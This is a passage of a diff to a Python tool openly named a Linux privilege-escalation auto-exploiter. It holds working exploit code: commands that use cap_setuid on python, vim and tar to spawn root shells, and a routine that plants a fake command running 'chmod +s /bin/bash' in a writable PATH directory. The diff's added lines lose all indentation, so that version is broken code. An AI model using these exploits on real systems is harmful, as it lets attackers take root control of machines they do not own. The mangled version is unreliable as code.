 # ─────────────────────────────────────────────
 
 def check_capabilities(exploit=True):
-    section("VECTOR 6 — Dangerous Linux Capabilities")
-    info("Searching for binaries with dangerous capabilities...")
+section("VECTOR 6 — Dangerous Linux Capabilities")
+info("Searching for binaries with dangerous capabilities...")
 
-    stdout, _, code = run_cmd("getcap -r / 2>/dev/null")
-    if not stdout:
-        skip("No capabilities found or getcap not available.")
-        return
+stdout, _, code = run_cmd("getcap -r / 2>/dev/null")
+if not stdout:
+skip("No capabilities found or getcap not available.")
+return
 
-    dangerous_caps = ["cap_setuid", "cap_setgid", "cap_sys_admin", "cap_dac_override"]
+dangerous_caps = ["cap_setuid", "cap_setgid", "cap_sys_admin", "cap_dac_override"]
 
-    for line in stdout.splitlines():
-        for cap in dangerous_caps:
-            if cap in line.lower():
-                found(f"Dangerous capability: {line}")
-                log_found("CAPABILITIES", line)
+for line in stdout.splitlines():
+for cap in dangerous_caps:
+if cap in line.lower():
+found(f"Dangerous capability: {line}")
+log_found("CAPABILITIES", line)
 
-                # Extract binary path
-                binary = line.split()[0]
-                name   = os.path.basename(binary)
+# Extract binary path
+binary = line.split()[0]
+name = os.path.basename(binary)
 
-                if exploit:
-                    # cap_setuid on python/perl/ruby = instant root
-                    if name in ["python", "python3", "perl", "ruby"]:
-                        cmd = f"{binary} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
-                        print(f"\n  {bold('Exploit command:')}")
-                        print(f"  {yellow(cmd)}\n")
-                        log_exploited("CAPABILITIES", cmd)
+if exploit:
+# cap_setuid on python/perl/ruby = instant root
+if name in ["python", "python3", "perl", "ruby"]:
+cmd = f"{binary} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+print(f"\n {bold('Exploit command:')}")
+print(f" {yellow(cmd)}\n")
+log_exploited("CAPABILITIES", cmd)
 
-                    elif name == "vim":
-                        cmd = f"{binary} -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
-                        print(f"  {yellow(cmd)}\n")
-                        log_exploited("CAPABILITIES", cmd)
+elif name == "vim":
+cmd = f"{binary} -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
+print(f" {yellow(cmd)}\n")
+log_exploited("CAPABILITIES", cmd)
 
-                    elif name == "tar":
-                        cmd = f"{binary} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
-                        print(f"  {yellow(cmd)}\n")
-                        log_exploited("CAPABILITIES", cmd)
+elif name == "tar":
+cmd = f"{binary} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
+print(f" {yellow(cmd)}\n")
+log_exploited("CAPABILITIES", cmd)
 
-                    else:
-                        info(f"Manual exploitation needed for: {binary}")
+else:
+info(f"Manual exploitation needed for: {binary}")
 
 
 # ─────────────────────────────────────────────
@@ -542,51 +542,51 @@ def check_capabilities(exploit=True):
 # ─────────────────────────────────────────────
 
 def check_path_hijacking(exploit=True):
-    section("VECTOR 7 — PATH Hijacking")
-    info("Checking for writable directories in $PATH...")
+section("VECTOR 7 — PATH Hijacking")
+info("Checking for writable directories in $PATH...")
 
-    path_dirs = os.environ.get("PATH", "").split(":")
-    writable_dirs = []
+path_dirs = os.environ.get("PATH", "").split(":")
+writable_dirs = []
 
-    for d in path_dirs:
-        if d and os.path.isdir(d) and os.access(d, os.W_OK):
-            found(f"Writable PATH directory: {d}")
-            log_found("PATH_HIJACK", d)
-            writable_dirs.append(d)
+for d in path_dirs:
+if d and os.path.isdir(d) and os.access(d, os.W_OK):
+found(f"Writable PATH directory: {d}")
+log_found("PATH_HIJACK", d)
+writable_dirs.append(d)
 
-    if not writable_dirs:
-        skip("No writable directories found in $PATH.")
-        return
+if not writable_dirs:
+skip("No writable directories found in $PATH.")
+return
 
-    # Look for SUID binaries or cron jobs that call commands without full path
-    info("Searching for SUID binaries that call relative commands...")
-    stdout, _, _ = run_cmd("find / -perm -4000 -type f 2>/dev/null")
+# Look for SUID binaries or cron jobs that call commands without full path
+info("Searching for SUID binaries that call relative commands...")
+stdout, _, _ = run_cmd("find / -perm -4000 -type f 2>/dev/null")
 
-    for suid_path in stdout.splitlines():
-        # Use strings to find relative command calls inside the binary
-        strings_out, _, _ = run_cmd(f"strings {suid_path} 2>/dev/null")
-        for line in strings_out.splitlines():
-            # Commands without full path (no leading /)
-            if line and not line.startswith("/") and len(line) < 20:
-                cmd_name = line.strip().split()[0]
-                if cmd_name.isalpha() and len(cmd_name) > 1:
-                    found(f"{suid_path} calls '{cmd_name}' without full path")
-                    log_found("PATH_HIJACK_SUID", f"{suid_path} → {cmd_name}")
+for suid_path in stdout.splitlines():
+# Use strings to find relative command calls inside the binary
+strings_out, _, _ = run_cmd(f"strings {suid_path} 2>/dev/null")
+for line in strings_out.splitlines():
+# Commands without full path (no leading /)
+if line and not line.startswith("/") and len(line) < 20:
+cmd_name = line.strip().split()[0]
+if cmd_name.isalpha() and len(cmd_name) > 1:
+found(f"{suid_path} calls '{cmd_name}' without full path")
+log_found("PATH_HIJACK_SUID", f"{suid_path} → {cmd_name}")
 
-                    if exploit and writable_dirs:
-                        fake_cmd = os.path.join(writable_dirs[0], cmd_name)
-                        payload  = "#!/bin/bash\nchmod +s /bin/bash\n"
-                        print(f"\n  {bold('Exploit — creating fake command:')} {fake_cmd}")
-                        print(f"  {yellow('After running the SUID binary, run:')} /bin/bash -p\n")
-                        try:
-                            with open(fake_cmd, "w") as f:
-                                f.write(payload)
-                            os.chmod(fake_cmd, 0o755)
-                            exploited(f"Fake '{cmd_name}' planted at {fake_cmd}")
-                            log_exploited("PATH_HIJACK", fake_cmd)
-                        except Exception as e:
-                            failed(str(e))
-                    break  # one finding per binary is enough
+if exploit and writable_dirs:
+fake_cmd = os.path.join(writable_dirs[0], cmd_name)
+payload = "#!/bin/bash\nchmod +s /bin/bash\n"
+print(f"\n {bold('Exploit — creating fake command:')} {fake_cmd}")
+print(f" {yellow('After running the SUID binary, run:')} /bin/bash -p\n")
+try:
+with open(fake_cmd, "w") as f:
+f.write(payload)
+os.chmod(fake_cmd, 0o755)
+exploited(f"Fake '{cmd_name}' planted at {fake_cmd}")
+log_exploited("PATH_HIJACK", fake_cmd)
+except Exception as e:
+failed(str(e))
+break # one finding per binary is enough
 
 
 # ─────────────────────────────────────────────
@@ -594,40 +594,40 @@ def check_path_hijacking(exploit=True):
 # ─────────────────────────────────────────────
 
 def print_report(save_to_file=False):
-    section("FINAL REPORT")
+section("FINAL REPORT")
 
-    print(f"\n  {bold('Target user:')} {get_current_user()} (uid={os.getuid()})")
-    print(f"  {bold('Scan time:')}   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+print(f"\n {bold('Target user:')} {get_current_user()} (uid={os.getuid()})")
+print(f" {bold('Scan time:')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
 
-    print(f"\n  {bold('Vectors found:    ')} {yellow(str(len(results['found'])))}")
-    print(f"  {bold('Exploits ready:   ')} {green(str(len(results['exploited'])))}")
-    print(f"  {bold('Failed attempts:  ')} {red(str(len(results['failed'])))}")
+print(f"\n {bold('Vectors found: ')} {yellow(str(len(results['found'])))}")
+print(f" {bold('Exploits ready: ')} {green(str(len(results['exploited'])))}")
+print(f" {bold('Failed attempts: ')} {red(str(len(results['failed'])))}")
 
-    if results["exploited"]:
-        print(f"\n  {bold(green('✓ EXPLOIT COMMANDS TO RUN:'))}")
-        for item in results["exploited"]:
-            print(f"\n    [{item['vector']}]")
-            print(f"    {yellow(item['cmd'])}")
+if results["exploited"]:
+print(f"\n {bold(green(' EXPLOIT COMMANDS TO RUN:'))}")
+for item in results["exploited"]:
+print(f"\n [{item['vector']}]")
+print(f" {yellow(item['cmd'])}")
 
-    if results["found"] and not results["exploited"]:
-        print(f"\n  {bold(yellow('! VECTORS FOUND — manual exploitation needed'))}")
-        for item in results["found"]:
-            print(f"    [{item['vector']}] {item['detail']}")
+if results["found"] and not results["exploited"]:
+print(f"\n {bold(yellow('! VECTORS FOUND — manual exploitation needed'))}")
+for item in results["found"]:
+print(f" [{item['vector']}] {item['detail']}")
 
-    if not results["found"]:
-        print(f"\n  {red('No obvious privilege escalation vectors found.')}")
-        print(f"  Consider: kernel exploits, password reuse, service exploits.")
+if not results["found"]:
+print(f"\n {red('No obvious privilege escalation vectors found.')}")
+print(f" Consider: kernel exploits, password reuse, service exploits.")
 
-    if save_to_file:
-        report_path = f"/tmp/privesc_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        with open(report_path, "w") as f:
-            f.write(f"AutoPrivEsc Report — {datetime.now()}\n")
-            f.write(f"User: {get_current_user()} (uid={os.getuid()})\n\n")
-            for section_name, items in results.items():
-                f.write(f"\n{'=' * 40}\n{section_name.upper()}\n{'=' * 40}\n")
-                for item in items:
-                    f.write(str(item) + "\n")
-        print(f"\n  {green('Report saved to:')} {report_path}")
+if save_to_file:
+report_path = f"/tmp/privesc_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+with open(report_path, "w") as f:
+f.write(f"AutoPrivEsc Report — {datetime.now()}\n")
+f.write(f"User: {get_current_user()} (uid={os.getuid()})\n\n")
+for section_name, items in results.items():
+f.write(f"\n{'=' * 40}\n{section_name.upper()}\n{'=' * 40}\n")
+for item in items:
+f.write(str(item) + "\n")
+print(f"\n {green('Report saved to:')} {report_path}")
 
 
 # ─────────────────────────────────────────────
@@ -635,39 +635,39 @@ def print_report(save_to_file=False):
 # ─────────────────────────────────────────────
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="AutoPrivEsc — Linux Privilege Escalation Auto-Exploiter"
-    )
-    parser.add_argument("--scan",   action="store_true", help="Scan only — do not attempt exploitation")
-    parser.add_argument("--report", action="store_true", help="Save report to /tmp/")
-    args = parser.parse_args()
+parser = argparse.ArgumentParser(
+description="AutoPrivEsc — Linux Privilege Escalation Auto-Exploiter"
+)
+parser.add_argument("--scan", action="store_true", help="Scan only — do not attempt exploitation")
+parser.add_argument("--report", action="store_true", help="Save report to /tmp/")
+args = parser.parse_args()
 
-    exploit = not args.scan
+exploit = not args.scan
 
-    print(f"\n{'═' * 55}")
-    print(bold(cyan("   AutoPrivEsc — Linux PrivEsc Scanner & Exploiter")))
-    print(f"{'═' * 55}")
-    print(f"  User  : {get_current_user()} (uid={os.getuid()})")
-    print(f"  Mode  : {'SCAN ONLY' if args.scan else bold(red('SCAN + EXPLOIT'))}")
-    print(f"  Time  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    print(f"{'═' * 55}")
+print(f"\n{'═' * 55}")
+print(bold(cyan(" AutoPrivEsc — Linux PrivEsc Scanner & Exploiter")))
+print(f"{'═' * 55}")
+print(f" User : {get_current_user()} (uid={os.getuid()})")
+print(f" Mode : {'SCAN ONLY' if args.scan else bold(red('SCAN + EXPLOIT'))}")
+print(f" Time : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+print(f"{'═' * 55}")
 
-    if is_root():
-        print(green("\n[+] Already running as root! Nothing to escalate."))
-        sys.exit(0)
+if is_root():
+print(green("\n[+] Already running as root! Nothing to escalate."))
+sys.exit(0)
 
-    # Run all vectors
-    check_suid(exploit)
-    check_sudo(exploit)
-    check_cron(exploit)
-    check_ld_preload(exploit)
-    check_writable_passwd(exploit)
-    check_capabilities(exploit)
-    check_path_hijacking(exploit)
+# Run all vectors
+check_suid(exploit)
+check_sudo(exploit)
+check_cron(exploit)
+check_ld_preload(exploit)
+check_writable_passwd(exploit)
+check_capabilities(exploit)
+check_path_hijacking(exploit)
 
-    # Final summary
-    print_report(save_to_file=args.report)
+# Final summary
+print_report(save_to_file=args.report)
 
 
 if __name__ == "__main__":
-    main()
+main()
